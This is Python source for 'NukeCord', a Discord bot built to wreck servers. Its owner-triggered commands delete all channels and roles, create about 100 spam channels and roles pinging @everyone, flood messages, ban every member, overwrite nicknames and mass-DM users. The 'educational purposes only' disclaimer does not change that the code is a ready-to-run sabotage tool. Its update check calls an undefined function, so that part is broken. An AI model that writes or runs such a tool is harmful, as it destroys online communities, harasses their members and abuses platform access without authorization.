import discord
import requests
from discord.ext import commands
import json
from colorama import Fore as color

intents = discord.Intents.default()
intents.members = True
intents.messages = True
intents.message_content = True
bot = commands.Bot(command_prefix="nc!", intents=intents)
bot.remove_command("help")

# -------------------
# CURRENT VERSION GOES HERE:
version = "2.1"
# -------------------

try:
    w = requests.get("https://pacity-database.glitch.me/nukecord.htm")
    ver = w.text
except requests.RequestException as e:
    print(color.RED + f"[!] Failed to fetch version: {e}")
    ver = version

if ver != version:
    print(color.RED + f"[!] UPDATE: NukeCord v.{ver} is available for download")
    print("\n")
    input(color.RESET + "Press enter to download the updated version ")
    internet(url="https://pacity-database.glitch.me/nukecord-download.htm")
    exit()

print(color.YELLOW + """
                         __    _                                   
                    _wr""        "-q__                             
                 _dP                 9m_     
               _#P                     9#_                         
              d#@                       9#m                        
             d##                         ###                       
            J###                         ###L                      
            {###K                       J###K                      
            ]####K      ___aaa___      J####F                      
        __gmM######_  w#P""   ""9#m  _d#####Mmw__                  
     _g##############mZ_         __g##############m_               
   _d####M@PPPP@@M#######Mmp gm#########@@PPP9@M####m_             
  a###""          ,Z"#####@" '######"\g          ""M##m            
 J#@"             0L  "*##     ##@"  J#              *#K           
 #"               `#    "_gmwgm_~    dF               `#_          
7F                 "#_   ]#####F   _dK                 JE          
]                    *m__ ##### __g@"                   F          
                       "PJ#####LP"                                 
 `                       0######_                      '           
                       _0########_                                   
     .               _d#####^#####m__              ,              
      "*w_________am#####P"   ~9#####mw_________w*"                  
          ""9@#####@M""           ""P@#####@M""                    



""")

f = open("config.json", "r")
x = f.read()
y = json.loads(x)
TOKEN = y["token"]
q = y["your_id"]
ID = int(q)
print(color.RESET + "[~] Do nc!help to get all commands")


@bot.event
async def on_ready():
    print(color.GREEN + f"[~] Logged in as {bot.user}")


@bot.event
async def on_command_error(ctx, error):
    print(color.RED + f"[!] Command error: {error}")


@bot.command()
async def help(ctx):
    if ctx.author.id == ID:
        embed = discord.Embed(
            title="This bot is running NukeCord",
            description="This is made for educational purposes only! Do never nuke servers of innocent people!\n__**Available commands:**__\n```\nnc!nuke <text>\nnc!alert <text>\nnc!flood <text>\nnc!ban\nnc!nicknames <text>\nnc!roles <text>\nnc!dm <text>\n```",
            color=0x36393e
        )
        embed.set_thumbnail(url="https://i.vgy.me/8LslSF.png")
        embed.set_footer(text="Made by github.com/pacity", icon_url="https://avatars.githubusercontent.com/u/84800113?v=4")
        await ctx.send(embed=embed)
    else:
        print(color.RED + f"[!] {ctx.author.name} tried running help command")


@bot.command()
@commands.guild_only()
async def nuke(ctx, *, arg):
    if ctx.author.id == ID:
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
            except:
                print(color.RED + f"[!] Error deleting {channel.name}")
        await ctx.guild.edit(name=arg)
        x = 100
        while x >= 0:
            ch = await ctx.guild.create_text_channel(arg)
            await ch.send(f"{arg} | @everyone")
            x = int(x) - 1
        print(color.GREEN + f"[~] Nuked {ctx.guild.name}")


@bot.command()
@commands.guild_only()
async def alert(ctx, *, arg):
    if ctx.author.id == ID:
        for channel in ctx.guild.channels:
            if isinstance(channel, discord.TextChannel):
                await channel.send(f"{arg}\n{arg}\n{arg}")


@bot.command()
@commands.guild_only()
async def flood(ctx, *, arg):
    if ctx.author.id == ID:
        i = 100
        while i >= 0:
            await ctx.send(arg)
            i = int(i) - 1
        print(color.GREEN + f"[~] Flooded {ctx.channel.name}")


@bot.command()
@commands.guild_only()
async def ban(ctx):
    if ctx.author.id == ID:
        msg = ctx.message
        await msg.add_reaction("🔄")
        for member in ctx.guild.members:
            try:
                if member == ctx.author:
                    print(color.YELLOW + f"[~] Skipped banning {ctx.author}")
                else:
                    await member.ban(reason=None)
            except:
                print(color.RED + f"[!] Failed banning {member}")
        await msg.add_reaction("✅")


@bot.command()
@commands.guild_only()
async def nicknames(ctx, *, arg):
    if ctx.author.id == ID:
        msg = ctx.message
        await msg.add_reaction("🔄")
        for member in ctx.guild.members:
            try:
                await member.edit(nick=arg)
            except:
                print(color.RED + f"[!] Failed to change nickname of {member}")
        await msg.add_reaction("✅")


@bot.command()
@commands.guild_only()
async def roles(ctx, *, arg):
    if ctx.author.id == ID:
        msg = ctx.message
        await msg.add_reaction("🔄")
        for role in ctx.guild.roles:
            try:
                if role.name == bot.user.name:
                    print(color.YELLOW + f"[~] Skipped deleting role {bot.user.name}")
                else:
                    await role.delete()
            except:
                print(color.RED + f"[!] Failed to delete {role.name}")
        x = 100
        guild = ctx.guild
        while x >= 0:
            await guild.create_role(name=arg)
            x = int(x) - 1
        await msg.add_reaction("✅")


@bot.command()
@commands.guild_only()
async def dm(ctx, *, arg):
    if ctx.author.id == ID:
        msg = ctx.message
        await msg.add_reaction("🔄")
        for member in ctx.guild.members:
            try:
                await member.send(arg)
            except:
                print(color.RED + f"[!] Failed to DM {member}")
        await msg.add_reaction("✅")


bot.run(TOKEN)
